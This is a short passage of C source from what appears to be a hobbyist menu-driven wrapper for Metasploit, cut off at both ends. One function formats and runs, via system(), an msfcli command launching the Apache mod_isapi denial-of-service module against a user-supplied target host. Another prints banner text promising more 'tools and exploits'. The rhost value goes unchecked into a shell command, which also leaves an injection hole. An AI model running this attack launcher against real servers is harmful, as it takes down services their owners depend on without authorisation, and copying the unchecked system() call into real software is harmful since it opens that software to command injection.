sprintf( command,"msfcli auxiliary/dos/http/apache_mod_isapi RHOST=%s E", rhost);
system(command);
msfcli();
}

void misc(void)
{
printf("\n\tM3S >> IF I BECOME SUCCESFULLY WITH THIS I WILL POST NEW TOOLS AND EXPLOITS IN MISC CATEGORY << \n\n");
printf("\n\tM3S >> SHARING IS CARING << \n\n");
exploitation();
}
